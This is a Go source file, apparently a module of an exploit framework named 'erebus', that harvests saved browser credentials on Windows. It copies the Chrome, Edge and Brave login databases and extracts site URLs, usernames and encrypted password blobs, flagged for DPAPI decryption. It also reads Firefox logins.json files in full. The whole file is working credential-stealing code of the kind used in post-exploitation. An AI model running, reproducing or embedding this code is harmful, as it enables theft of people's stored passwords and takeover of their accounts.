//go:build windows

package creds

import (
	"context"
	"database/sql"
	"fmt"
	"os"
	"path/filepath"

	pb "github.com/KKingZero/erebus-exploit-framwork/pkg/pb"
	_ "modernc.org/sqlite"
)

func dumpBrowser(_ context.Context, _ *pb.CredDumpConfig) (*pb.CredDumpResult, error) {
	var creds []*pb.Credential

	// Chrome/Edge credential paths
	localAppData := os.Getenv("LOCALAPPDATA")
	appData := os.Getenv("APPDATA")

	chromePaths := []struct {
		name string
		path string
	}{
		{"Chrome", filepath.Join(localAppData, "Google", "Chrome", "User Data", "Default", "Login Data")},
		{"Edge", filepath.Join(localAppData, "Microsoft", "Edge", "User Data", "Default", "Login Data")},
		{"Brave", filepath.Join(localAppData, "BraveSoftware", "Brave-Browser", "User Data", "Default", "Login Data")},
	}

	for _, bp := range chromePaths {
		found, err := extractChromiumCreds(bp.name, bp.path)
		if err == nil {
			creds = append(creds, found...)
		}
	}

	// Firefox
	firefoxProfiles := filepath.Join(appData, "Mozilla", "Firefox", "Profiles")
	entries, err := os.ReadDir(firefoxProfiles)
	if err == nil {
		for _, entry := range entries {
			if !entry.IsDir() {
				continue
			}
			profilePath := filepath.Join(firefoxProfiles, entry.Name())
			loginsPath := filepath.Join(profilePath, "logins.json")
			if _, err := os.Stat(loginsPath); err == nil {
				data, _ := os.ReadFile(loginsPath)
				creds = append(creds, &pb.Credential{
					Type:   "firefox_logins",
					Source: fmt.Sprintf("Firefox (%s)", entry.Name()),
					Value:  string(data),
				})
			}
		}
	}

	if len(creds) == 0 {
		return nil, fmt.Errorf("no browser credentials found")
	}

	return &pb.CredDumpResult{
		Method:      "browser",
		Credentials: creds,
	}, nil
}

func extractChromiumCreds(browser, dbPath string) ([]*pb.Credential, error) {
	if _, err := os.Stat(dbPath); err != nil {
		return nil, err
	}

	// Copy DB to temp to avoid locking issues
	tmpFile, err := os.CreateTemp("", "logindata-*.db")
	if err != nil {
		return nil, err
	}
	tmpPath := tmpFile.Name()
	tmpFile.Close()
	defer os.Remove(tmpPath)

	data, err := os.ReadFile(dbPath)
	if err != nil {
		return nil, err
	}
	os.WriteFile(tmpPath, data, 0600)

	db, err := sql.Open("sqlite", tmpPath)
	if err != nil {
		return nil, err
	}
	defer db.Close()

	rows, err := db.Query("SELECT origin_url, username_value, password_value FROM logins WHERE length(password_value) > 0")
	if err != nil {
		return nil, err
	}
	defer rows.Close()

	var creds []*pb.Credential
	for rows.Next() {
		var url, username string
		var encPassword []byte
		if err := rows.Scan(&url, &username, &encPassword); err != nil {
			continue
		}

		creds = append(creds, &pb.Credential{
			Type:     "browser_password",
			Source:   browser,
			Username: username,
			Domain:   url,
			Value:    fmt.Sprintf("encrypted(%d bytes) - decrypt with DPAPI key", len(encPassword)),
		})
	}

	return creds, nil
}
